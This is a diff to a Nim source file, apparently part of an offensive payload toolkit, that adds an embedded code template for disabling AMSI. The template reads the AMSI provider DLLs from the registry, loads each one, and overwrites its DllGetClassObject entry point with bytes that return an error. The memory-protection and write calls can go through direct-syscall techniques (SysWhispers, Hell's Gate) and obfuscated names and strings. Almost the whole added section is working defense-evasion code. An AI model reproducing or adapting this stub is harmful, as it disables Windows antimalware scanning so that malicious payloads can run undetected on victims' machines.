@@ -135,6 +135,195 @@ when isMainModule:
 
 """
 
+let AMSIProviderPatchStub * = """
+
+from winregistry/winregistry import RegHandle,open,enumSubkeys,readString,samRead,enumValueNames
+
+var
+  CLSID: string
+  ProviderDLLs: seq[string]
+  ProviderHandle: RegHandle
+  InProcServer32Handle: RegHandle
+# http://miere.ru/docs/registry/
+proc getProviderDLLs(): seq[string] =
+  try:
+    ProviderHandle = open("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\AMSI\\Providers\\", samRead)
+  except OSError:
+    echo "err: ", getCurrentExceptionMsg()
+  finally:
+    for CLSID in enumSubkeys(ProviderHandle):
+      #echo CLSID
+      var ProviderKey: string = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\"
+      ProviderKey.add(CLSID)
+      ProviderKey.add("\\InprocServer32\\") 
+      try:
+        InProcServer32Handle = open(ProviderKey, samRead)
+      except OSError:
+        echo "err: ", getCurrentExceptionMsg()
+      ProviderDLLs.add(readString(InProcServer32Handle, ""))
+
+    return ProviderDLLs
+
+proc ProviderPatchAmsi(): void =
+    var
+        amsi: HMODULE
+        cs: pointer
+        op: ULONG
+        t: ULONG
+        disabled: bool = false
+    
+    when defined amd64:
+        const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
+    elif defined i386:
+        const patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
+    
+    var ProviderDLLs: seq[string] = getProviderDLLs()
+
+    for DLL in ProviderDLLs:
+      var DLLtoLoad = DLL
+      DLLtoLoad.removePrefix('"')
+      DLLtoLoad.removeSuffix('"')
+
+      when defined(DInvoke):
+        amsi = MyLoadLibraryA(DLLtoLoad)
+      else:
+        amsi = LoadLibraryA(DLLtoLoad)
+      if (amsi == 0):
+        when defined(verbose):
+          echo obf("[X] Failed to load "), DLLtoLoad
+          return
+      else:
+        when defined(verbose):
+          echo obf("[+] Loaded "), DLLtoLoad
+      when defined(DInvoke):
+        cs = MyGetProcAddress(amsi,obf("DllGetClassObject"))
+      else:
+        cs = GetProcAddress(amsi,obf("DllGetClassObject"))
+      if isNil(cs):
+        when defined(verbose):
+            echo obf("[X] Failed to get the address of 'DllGetClassObject'")
+        return
+      
+      var oldProtection: DWORD = 0
+      var success: BOOL
+      var protectAddress = cs
+      var friendlycodeLength = cast[SIZE_T](patch.len)
+      when defined(DInvoke):
+        var pHandle: HANDLE = MyGetCurrentProcess()
+      else:
+        var pHandle: HANDLE = GetCurrentProcess()
+      var 
+        status          : NTSTATUS          = 0x00000000
+        buffer          : LPVOID
+    
+      when defined(GetSyscallStub):
+        var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)
+        # Define NtProtectVirtualMemory
+        var NtProtectVirtualMemory: myNtProtectVirtM = cast[myNtProtectVirtM](cast[LPVOID](syscallStub_NtProtect))
+        when defined(DInvoke):
+            success = MyVirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
+        else:
+            success = VirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
+        # define NtWriteVirtualMemory
+        let NtWriteVirtualMemory = cast[myNtWriteVirtM](cast[LPVOID](syscallStub_NtWrite))
+        when defined(DInvoke):
+            success = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
+        else:
+            success = VirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
+        success = GetSyscallStub("NtProtectVirtualMemory", cast[LPVOID](syscallStub_NtProtect))
+        success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
+            
+      when defined(SysWhispers):
+        status = uashdiasdj(pHandle, addr protectAddress,addr friendlycodeLength,0x04,addr t)
+                
+        if not NT_SUCCESS(status):
+            when defined(verbose):
+                echo obf("[-] Failed to change memory protections.")
+        else:
+            when defined(verbose):
+                echo obf("[*] Applying Syscall (SysWhispers) AMSI patch")
+        var 
+            bytesWritten: SIZE_T
+        var outLength: SIZE_T
+        status = oqiazasusjk(pHandle,cs,unsafeAddr patch,patch.len,addr outLength)
+        if not NT_SUCCESS(status):
+            when defined(verbose):
+                echo obf("[-] Failed to write memory.")
+        else:
+            when defined(verbose):
+                echo obf("[+] oqiazasusjk Succeed!")
+                
+               
+        status = uashdiasdj(pHandle,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
+                
+        if not NT_SUCCESS(status):
+            when defined(verbose):
+                echo obf("[-] Failed to allocate memory.")
+        else:
+            when defined(verbose):
+                echo obf("[+] OldProtect set back")
+            disabled = true
+      else:
+        when defined(HellsGate):
+            if getSyscall(ntProtectTable):                
+                syscall = ntProtectTable.wSysCall
+            else:
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+        success = NtProtectVirtualMemory(pHandle,addr protectAddress,addr friendlycodeLength,0x04,addr t) 
+        if (success != 0):
+            when defined(verbose):
+                echo obf("NtProtectVirtualMemory failed")
+            return
+        when defined(verbose):
+            echo obf("[*] Applying Syscall AMSI patch")
+        when defined(HellsGate):
+            if getSyscall(ntWriteTable):
+                syscall = ntWriteTable.wSysCall
+            else:
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+        var outLength: SIZE_T
+    
+        success = NtWriteVirtualMemory(pHandle,cs,unsafeAddr patch,patch.len,addr outLength)
+    
+        if (success != 0):
+            when defined(verbose):
+                echo obf("NtWriteVirtualMemory failed")
+            return
+        
+        when defined(HellsGate):
+            if getSyscall(ntProtectTable):
+                syscall = ntProtectTable.wSysCall
+            else:
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+        success =  NtProtectVirtualMemory(pHandle,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
+        if (success != 0):
+            when defined(verbose):
+                echo obf("NtProtectVirtualMemory failed")
+            return
+        else:
+            when defined(verbose):
+                echo obf("[*] OldProtect set back")
+            disabled = true
+        
+        when defined(GetSyscallStub):
+            when defined(DInvoke):
+                success = MyVirtualProtect(syscallStub_NtProtect, 4096, PAGE_READWRITE, addr op)
+            else:
+                success = VirtualProtect(syscallStub_NtProtect, 4096, PAGE_READWRITE, addr op)
+            # Fails for some reason
+            #success = NtProtectVirtualMemory(pHandle,addr syscallStub_NtProtect,addr friendlycodeLength,PAGE_READWRITE,addr op)
+            when defined(verbose):
+                echo obf("[*] Restored Stub protections: ") & $success
+      when defined(verbose):
+        echo obf("[*] AMSI disabled: ") & $disabled
+    return
+when isMainModule:
+    ProviderPatchAmsi()
+"""
+
 let AMSIStub * = """
 proc PatchAmsi(): bool =
     var
